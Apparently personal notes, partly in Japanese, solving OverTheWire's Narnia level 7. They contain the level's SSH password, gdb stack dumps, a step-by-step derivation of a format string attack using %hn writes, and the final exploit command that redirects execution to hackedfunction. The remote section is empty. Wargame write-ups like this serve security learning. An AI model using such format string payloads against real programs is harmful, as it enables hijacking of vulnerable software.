```sh
$ ssh -p 2226 narnia7@narnia.labs.overthewire.org
```

password: ahkiaziphu

hackedfunction(\x06\x87\x04\x08)に飛ばす


## In local

"A"\*140
```
gdb-peda$ x/100wx $esp
0xffffbdd0: 0xffffbdf0  0x00000080  0xffffc1f6  0xffffbe48
0xffffbde0: 0xf7ffda74  0x00000001  0xf7fd4b48  0x080486e0 <- addr of goodfunction()
0xffffbdf0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffbe00: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffbe10: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffbe20: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffbe30: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffbe40: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffbe50: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffbe60: 0x41414141  0x41414141  0x41414141  0x00414141
0xffffbe70: 0x00000002  0xffffbf34  0xffffbe98  0x080486d8
```

format string attack

"A" * 4

```
gdb-peda$ x/100wx $esp
0xffffbe50: 0xffffbe70  0x00000080  0xffffc27e  0xffffbec8
0xffffbe60: 0xf7ffda74  0x00000001  0xf7fd4b48  0x080486e0
0xffffbe70: 0x00000000  0x00000000  0x00000000  0x00000000
```

after snprintf()

```
gdb-peda$ x/100wx $esp
0xffffbe50: 0xffffbe70  0x00000080  0xffffc27e  0xffffbec8
0xffffbe60: 0xf7ffda74  0x00000001  0xf7fd4b48  0x080486e0
0xffffbe70: 0x41414141  0x00000000  0x00000000  0x00000000
```

<b>Use format string attack</b>

書き込みたいポインタのアドレス -> 0xffffbefc(buffer)

よって、[addr + 2][addr]は
\xfe\xbe\xff\xff\xfc\xbe\xff\xff になる

次に、書き込むアドレスの値はhackedfunction()の値である0x8048706

HOB(high order bytes) -> 0x0804
LOB(low order bytes)  -> 0x8706

HOB < LOB なので、%.[HOB - 8]x を求める。

HOB - 8 -> 0x7fc -> 2044

%.2044x

次に %[offset]$hn -> %6\$hn


%.[LOB - HOB]x

LOB - HOB -> 0x7f02 -> 32514

%.32514x

次に %[offset + 1]$hn -> %7\$hn

$(echo -e "\xfe\xbe\xff\xff\xfc\xbe\xff\xff"%.2044x%6\$hn%.32514x%7\$hn)


アドレスを"\xde\xbe\xff\xff\xdc\xbe\xff\xff"にしたらいけた

なんで0x20分ずれてる？？？ ローカルだとなぜか[(addr-0x20) + 2][(addr-0x20)]になってる

./narnia7 $(echo -e "\xde\xbe\xff\xff\xdc\xbe\xff\xff")%.2044x%6\$hn%.32514x%7\$hn


## In remote
